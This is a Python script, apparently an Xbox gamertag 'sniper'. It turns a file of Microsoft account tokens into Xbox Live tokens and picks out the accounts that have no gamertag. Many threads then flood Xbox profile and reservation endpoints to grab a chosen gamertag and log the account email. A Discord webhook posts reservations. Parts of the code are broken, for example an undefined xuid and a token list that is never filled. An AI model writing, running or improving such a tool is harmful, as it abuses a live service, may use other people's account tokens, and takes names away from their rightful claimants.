import os
import sys
import json
import time
import ctypes
import socket
import random
import requests
import threading
from colorama import init
from discord_webhook import DiscordWebhook, DiscordEmbed
from threading import Thread
init()

swap = '[\033[1;32;40m+\033[1;37;40m]'
error = '[\033[1;31;40mError\033[1;37;40m]'

def Clear():
    if sys.platform == 'win32':
        os.system('cls')
    elif sys.platform == 'linux' or sys.platform == 'linux2':
        os.system('clear')

class MS_Token_Grabber:
    def __init__(self):
        self.Threading()

    with open('tokens.txt', 'r') as file:
        ms_user_tokens = file.read().splitlines()
        if len(ms_user_tokens) < 1:
            Clear()
            print('{} No Tokens Found In tokens.txt'.format(error))
            os._exit(0)

    def Grab_Tokens(self, token):
        global ms_grabbed

        try:
            json = {'RelyingParty': 'http://accounts.xboxlive.com', 'TokenType': 'JWT', 'Properties': {'UserTokens': [token], 'SandboxId': 'RETAIL'}}
            response = requests.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=json)

            if response.status_code == 200:
                token = 'XBL3.0 x={};{}'.format(response.json()['DisplayClaims']['xui'][0]['uhs'], response.json()['Token'])

                headers = {'Authorization': token}
                response = requests.get('https://accounts.xboxlive.com/users/current/profile', headers=headers)

                if '"gamerTag":null' in response.text:
                    ms_tokens.append(token)
                    ms_grabbed += 1
                else:
                    pass
            else:
                pass
        except:
            pass


    def Threading(self):
        for token in self.ms_user_tokens:
            thread = Thread(target=self.Grab_Tokens, args=(token,))
            thread.setDaemon(True)
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

class Main_Swapper:
    def __init__(self):
        self.printed = 0
        self.attempts = 0
        self.other = 0
        self.rl = 0
        self.rs = 0

    def Reserve(self):
        while True:
            for token in xbox_tokens:
                json = {'classicGamertag': gamertag, 'reservationId': xuid, 'targetGamertagFields': 'classicGamertag'}
                headers = {'x-xbl-contract-version': '1', 'Authorization': token}

                response = requests.post('https://gamertag.xboxlive.com/gamertags/reserve', json=json, headers=headers)

                if response.status_code == 409:
                    self.attempts += 1
                    self.RPS_Threading()
                elif response.status_code == 200:
                    if self.printed == 0:
                        self.printed += 1
                        print('{} Successfully Reserved \033[1;32;40m{}\033[1;37;40m After \033[1;32;40m{:,}\033[1;37;40m Attempt(s)!\n'.format(swap, gamertag, self.attempts))
                        self.SendHook(gamertag, self.attempts)
                elif response.status_code == 429:
                    self.rl += 1
                else:
                    self.other += 1

    def RPS(self):
        while True:
            before = self.attempts
            time.sleep(1)
            self.rs = self.attempts - before
            
    def SendHook(self, gamertag, elapsed):
        webhook = DiscordWebhook(url='', username="Claimed!")
        embed = DiscordEmbed(title='Fresh Swap!', color='ffffff')
        embed.set_footer(text='Made By force#0777')
        embed.add_embed_field(name="𝙂𝙖𝙢𝙚𝙧𝙩𝙖𝙜", value="`{}`".format(gamertag), inline=False)
        embed.add_embed_field(name="𝘼𝙩𝙩𝙚𝙢𝙥𝙩𝙨", value="`{}`".format(elapsed), inline=False)
        embed.set_thumbnail(url='')
        webhook.add_embed(embed)
        response = webhook.execute() 
        
    def Threading(self):
        for _ in range(thread_count):
            thread = Thread(target=self.Reserve)
            thread.start()

    def RPS_Threading(self):
        thread = Thread(target=self.RPS)
        thread.setDaemon(True)
        thread.start()

class Fresh_Swapper:
    def __init__(self):
        self.printed = 0
        self.attempts = 0
        self.other = 0
        self.rl = 0
        self.rs = 0

    def Fresh(self):
        while True:
            for token in ms_tokens:
                post = {'dateOfBirth': '2000-01-01T00:00:00.0000000', 'email': '', 'firstName': '', 'gamerTag': gamertag, 'gamerTagChangeReason': None, 'homeAddressInfo': {'city': None, 'country': 'US', 'postalCode': None, 'state': None, 'street1': None, 'street2': None}, 'homeConsole': None, 'imageUrl': '', 'isAdult': True, 'lastName': '', 'legalCountry': 'US', 'locale': 'en-US', 'midasConsole': None, 'msftOptin': True, 'ownerHash': None, 'ownerXuid':None, 'partnerOptin': True, 'requirePasskeyForPurchase': False, 'requirePasskeyForSignIn': False, 'subscriptionEntitlementInfo': None, 'touAcceptanceDate': '2000-01-01T00:00:00.0000000', 'userHash': token.split(';')[0].split('=')[1], 'userKey': None, 'userXuid': '216258806147975844'}
                headers = {'x-xbl-contract-version': '4', 'Authorization': token}
                response = requests.post('https://accountstroubleshooter.xboxlive.com/users/current/profile', json=post, headers=headers)
                if response.status_code == 400:
                    self.attempts += 1
                    print('Attempts - {} | RL - {} | R/S - ({:,})'.format(self.attempts, self.rl, self.rs), end="\r")
                    self.RPS_Threading()
                elif response.status_code == 200:
                    if response.json()['gamerTag'] == gamertag:
                        if self.printed == 0:
                            self.printed += 1

                            print('{} Successfully Claimed \033[1;32;40m{}\033[1;37;40m After \033[1;32;40m{:,}\033[1;37;40m Attempt(s)!\n'.format(swap, gamertag, self.attempts))

                            headers = {'Authorization': token}
                            response = requests.get('https://accounts.xboxlive.com/users/current/profile', headers=headers)
                            email = response.json()['email']

                            with open('claimed.txt', 'a') as file:
                                file.write('Gamertag: {}\nEmail: {}\n\n'.format(gamertag, email))
                    else:
                        try:
                            ms_tokens.remove(token)
                        except ValueError:
                            pass
                            
                elif response.status_code == 429:
                    self.rl += 1
                else:
                    self.other += 1

    def RPS(self):
        while True:
            before = self.attempts
            time.sleep(1)
            self.rs = self.attempts - before
        
    def Threading(self):
        for _ in range(thread_count):
            thread = Thread(target=self.Fresh)
            thread.start()

    def RPS_Threading(self):
        thread = Thread(target=self.RPS)
        thread.setDaemon(True)
        thread.start()

if __name__ == '__main__':
    Clear()
    threads = []
    xbox_tokens = []
    ms_tokens = []
    xbox_grabbed = 0
    ms_grabbed = 0
    MS_Token_Grabber()
    print('{} Tokens Authed - ({:,})'.format(swap, ms_grabbed))
    print('\n{}'.format(swap), end='');gamertag = input(' Gamertag: ')
    print('{}'.format(swap), end='');thread_count = int(input(' Thread Count: '));print()
    Fresh_Swapper().Threading()

